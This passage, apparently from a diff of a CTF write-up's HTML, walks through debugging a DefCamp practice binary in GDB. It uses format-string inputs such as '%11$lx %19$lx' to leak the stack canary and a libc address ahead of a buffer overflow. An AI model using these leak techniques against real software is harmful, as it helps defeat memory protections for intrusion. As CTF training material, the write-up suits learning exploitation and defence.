+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007b8</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x640</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007bd</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007c1</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007c5</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x10</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ca</span> <span class="err">&lt;+</span><span class="mi">80</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007cd</span> <span class="err">&lt;+</span><span class="mi">83</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007d2</span> <span class="err">&lt;+</span><span class="mi">88</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe9</span><span class="p">]</span>        <span class="c1"># 0x8c2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007d9</span> <span class="err">&lt;+</span><span class="mi">95</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x620</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007de</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007e2</span> <span class="err">&lt;+</span><span class="mi">104</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007e5</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ea</span> <span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x640</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ef</span> <span class="err">&lt;+</span><span class="mi">117</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xd2</span><span class="p">]</span>        <span class="c1"># 0x8c8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007f6</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007fb</span> <span class="err">&lt;+</span><span class="mi">129</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x640</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000800</span> <span class="err">&lt;+</span><span class="mi">134</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000804</span> <span class="err">&lt;+</span><span class="mi">138</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000808</span> <span class="err">&lt;+</span><span class="mi">142</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000080d</span> <span class="err">&lt;+</span><span class="mi">147</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000810</span> <span class="err">&lt;+</span><span class="mi">150</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000815</span> <span class="err">&lt;+</span><span class="mi">155</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000081a</span> <span class="err">&lt;+</span><span class="mi">160</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000081e</span> <span class="err">&lt;+</span><span class="mi">164</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">This</span> <span class="no">line</span> <span class="no">checks</span> <span class="no">whether</span> <span class="no">the</span> <span class="no">provided</span> <span class="no">canary</span> <span class="no">is</span> <span class="no">equal</span> <span class="no">to</span> <span class="no">the</span> <span class="no">one</span> <span class="no">calculated</span> <span class="no">before</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000827</span> <span class="err">&lt;+</span><span class="mi">173</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">je</span>     <span class="mh">0x82e</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">180</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000829</span> <span class="err">&lt;+</span><span class="mi">175</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x630</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000082e</span> <span class="err">&lt;+</span><span class="mi">180</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">leave</span>  
+</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000000082f</span> <span class="err">&lt;+</span><span class="mi">181</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
+</span></span></code></pre></div><p>Let&rsquo;s try to check those two offsets 11 and 19 to see if it&rsquo;s the stack canary or not:-</p>
+<p>At first, we need to setup a breakpoint at the instruction where the comaprison happens i.e. <code>main+164</code> and we will just give random input at second and analyse the registers.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x81e</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span> 
+</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">name</span> <span class="p">:</span> <span class="err">%</span><span class="mi">11</span><span class="no">$lx</span> <span class="err">%</span><span class="mi">19</span><span class="no">$lx</span> 
+</span></span><span class="line"><span class="cl"><span class="no">Hello</span>
+</span></span><span class="line"><span class="cl"><span class="err">50</span><span class="nf">a01b0663fa1e00</span> <span class="no">ebd42dea12670b41</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Enter</span> <span class="no">sentence</span> <span class="p">:</span> <span class="no">AAAA</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rax</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$rbx</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$rcx</span>   <span class="p">:</span> <span class="mi">0x50a01b0663fa1e00</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rdx</span>   <span class="p">:</span> <span class="mi">0x00007ffff7dd18d0</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rsp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd10</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rbp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd40</span>  <span class="err">→</span>  <span class="mi">0x0000555555554830</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">r15</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rsi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd20</span>  <span class="err">→</span>  <span class="mi">0x2520000a41414141</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAAA</span><span class="err">&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rdi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd21</span>  <span class="err">→</span>  <span class="mi">0x312520000a414141</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAA</span><span class="err">&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rip</span>   <span class="p">:</span> <span class="mi">0x000055555555481e</span>  <span class="err">→</span>  <span class="mi">0x000028250c334864</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">dH3</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="err">%(&#34;?)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r8</span>    <span class="p">:</span> <span class="mi">0x0000555555756675</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">x</span> <span class="err">%</span><span class="mi">19</span><span class="no">$lx</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r9</span>    <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r10</span>   <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r11</span>   <span class="p">:</span> <span class="mi">0x246</span>             
+</span></span><span class="line"><span class="cl"><span class="no">$r12</span>   <span class="p">:</span> <span class="mi">0x0000555555554670</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_start</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r13</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde20</span>  <span class="err">→</span>  <span class="mi">0x0000000000000001</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r14</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$r15</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$eflags</span><span class="p">:</span> <span class="p">[</span><span class="no">ZERO</span> <span class="no">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">$cs:</span> <span class="err">0</span><span class="nf">x0033</span> <span class="no">$ss</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$ds</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$es</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$fs</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$gs</span><span class="p">:</span> <span class="mi">0x0000</span> 
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">stack</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd10</span><span class="err">│+</span><span class="mi">0x0000</span><span class="p">:</span> <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>	 <span class="err">←</span> <span class="no">$rsp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd18</span><span class="err">│+</span><span class="mi">0x0008</span><span class="p">:</span> <span class="mi">0x00007ffff7dcfa00</span>  <span class="err">→</span>  <span class="mi">0x00000000fbad2288</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd20</span><span class="err">│+</span><span class="mi">0x0010</span><span class="p">:</span> <span class="mi">0x2520000a41414141</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAAA</span><span class="err">&#34;?</span><span class="p">)</span>	 <span class="err">←</span> <span class="no">$rsi</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd28</span><span class="err">│+</span><span class="mi">0x0018</span><span class="p">:</span> <span class="mi">0x00000a786c243931</span> <span class="p">(</span><span class="err">&#34;</span><span class="mi">19</span><span class="no">$lx</span><span class="err">&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd30</span><span class="err">│+</span><span class="mi">0x0020</span><span class="p">:</span> <span class="mi">0x00007fffffffde20</span>  <span class="err">→</span>  <span class="mi">0x0000000000000001</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd38</span><span class="err">│+</span><span class="mi">0x0028</span><span class="p">:</span> <span class="mi">0x50a01b0663fa1e00</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd40</span><span class="err">│+</span><span class="mi">0x0030</span><span class="p">:</span> <span class="mi">0x0000555555554830</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">r15</span>	 <span class="err">←</span> <span class="no">$rbp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd48</span><span class="err">│+</span><span class="mi">0x0038</span><span class="p">:</span> <span class="mi">0x00007ffff7a05b97</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="err">&gt;</span> <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nl">code:x86:</span><span class="err">64</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554810</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">150</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">155</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555481a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">160</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"> <span class="err">→</span> <span class="err">0</span><span class="nf">x55555555481e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span><span class="err">&gt;</span>       <span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554827</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">173</span><span class="err">&gt;</span>       <span class="no">je</span>     <span class="mh">0x55555555482e</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">180</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554829</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">175</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554630</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555482e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">180</span><span class="err">&gt;</span>       <span class="no">leave</span>  
+</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555482f</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">181</span><span class="p">&gt;</span>       <span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">   <span class="mh">0x555555554830</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">0</span><span class="p">&gt;</span> <span class="no">push</span>   <span class="no">r15</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;q3&#34;, stopped, reason: BREAKPOINT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x55555555481e → main()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0x000055555555481e</span> <span class="no">in</span> <span class="no">main</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="no">$rcx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="mi">0x50a01b0663fa1e00</span>    <span class="err">&lt;</span><span class="p">--</span> <span class="no">Ye</span><span class="p">,</span> <span class="no">there</span> <span class="no">it</span> <span class="no">is.</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
+</span></span></code></pre></div><p>Here, we have a stack canary leak which is equal to the one in <code>rcx</code> register where it&rsquo;s getting stored. So, now we need to find out the libc offset as we are now on buffer overflow stage. As we already know we need to get libc offset and from earlier that format string vulnerability was causing the libc address to leak, so it&rsquo;d be a matter of time to find it out:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span> 
+</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">name</span> <span class="p">:</span> <span class="err">%</span><span class="mi">3</span><span class="no">$lx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Hello</span>
+</span></span><span class="line"><span class="cl"><span class="err">7</span><span class="nf">ffff7af4154</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Enter</span> <span class="no">sentence</span> <span class="p">:</span> <span class="err">^</span><span class="no">C</span>  
+</span></span><span class="line"><span class="cl"><span class="no">Program</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGINT</span><span class="p">,</span> <span class="no">Interrupt.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">vmmap</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Start</span>              <span class="no">End</span>                <span class="no">Offset</span>             <span class="no">Perm</span> <span class="no">Path</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555554000</span> <span class="mi">0x0000555555555000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555754000</span> <span class="mi">0x0000555555755000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555755000</span> <span class="mi">0x0000555555756000</span> <span class="mi">0x0000000000001000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000555555756000</span> <span class="mi">0x0000555555777000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> <span class="p">[</span><span class="no">heap</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff79e4000</span> <span class="mi">0x00007ffff7bcb000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7bcb000</span> <span class="mi">0x00007ffff7dcb000</span> <span class="mi">0x00000000001e7000</span> <span class="p">---</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7dcb000</span> <span class="mi">0x00007ffff7dcf000</span> <span class="mi">0x00000000001e7000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7dcf000</span> <span class="mi">0x00007ffff7dd1000</span> <span class="mi">0x00000000001eb000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7dd1000</span> <span class="mi">0x00007ffff7dd5000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">0x00007ffff7dd5000</span> <span class="mi">0x00007ffff7dfc000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">ld-2.27.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7fd1000</span> <span class="mi">0x00007ffff7fd3000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">0x00007ffff7ff7000</span> <span class="mi">0x00007ffff7ffa000</span> <span class="mi">0x0000000000000000</span> <span class="no">r--</span> <span class="p">[</span><span class="no">vvar</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffa000</span> <span class="mi">0x00007ffff7ffc000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="p">[</span><span class="no">vdso</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffc000</span> <span class="mi">0x00007ffff7ffd000</span> <span class="mi">0x0000000000027000</span> <span class="no">r--</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">ld-2.27.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffd000</span> <span class="mi">0x00007ffff7ffe000</span> <span class="mi">0x0000000000028000</span> <span class="no">rw-</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">ld-2.27.so</span>
